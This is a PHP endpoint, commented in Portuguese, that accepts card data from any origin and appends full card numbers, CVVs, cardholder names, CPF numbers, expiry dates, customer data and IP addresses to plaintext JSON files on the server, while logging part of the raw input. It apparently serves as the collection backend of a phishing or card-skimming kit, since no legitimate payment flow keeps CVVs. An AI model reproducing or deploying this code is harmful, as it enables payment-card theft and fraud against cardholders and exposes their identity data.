<?php
/**
 * Endpoint para salvar dados do cartão de crédito
 */
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Log para debug
error_log('=== SAVE CARD DATA ===');
error_log('Method: ' . $_SERVER['REQUEST_METHOD']);

$input = file_get_contents('php://input');
error_log('Input: ' . substr($input, 0, 200));

$data = json_decode($input, true);

if (!$data) {
    error_log('Erro: Dados não fornecidos ou JSON inválido');
    echo json_encode(['success' => false, 'error' => 'Dados não fornecidos']);
    exit;
}

$dataDir = __DIR__ . '/../data';
error_log('Data dir: ' . $dataDir);

if (!is_dir($dataDir)) {
    if (!mkdir($dataDir, 0755, true)) {
        error_log('Erro: Não foi possível criar diretório ' . $dataDir);
        echo json_encode(['success' => false, 'error' => 'Erro ao criar diretório']);
        exit;
    }
}

$cardData = [
    'id' => uniqid('card_', true),
    'timestamp' => date('Y-m-d H:i:s'),
    'card_number' => $data['cardNumber'] ?? '',
    'card_number_last4' => substr($data['cardNumber'] ?? '', -4),
    'card_name' => $data['cardName'] ?? '',
    'card_cpf' => $data['cardCPF'] ?? '',
    'card_cvv' => $data['cardCVV'] ?? '',
    'card_brand' => $data['cardBrand'] ?? 'unknown',
    'card_validity' => $data['cardValidity'] ?? '',
    'amount' => $data['amount'] ?? 0,
    'customer_data' => $data['customerData'] ?? [],
    'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
];

$filename = $dataDir . '/card_data_' . date('Y-m-d') . '.json';
error_log('Filename: ' . $filename);

$allData = [];

if (file_exists($filename)) {
    $allData = json_decode(file_get_contents($filename), true) ?: [];
}

$allData[] = $cardData;

$result = file_put_contents($filename, json_encode($allData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

if ($result === false) {
    error_log('Erro: Não foi possível salvar arquivo');
    echo json_encode(['success' => false, 'error' => 'Erro ao salvar arquivo']);
    exit;
}

error_log('Sucesso: Dados salvos - ' . $cardData['id']);
echo json_encode(['success' => true, 'message' => 'Dados salvos com sucesso', 'id' => $cardData['id']]);

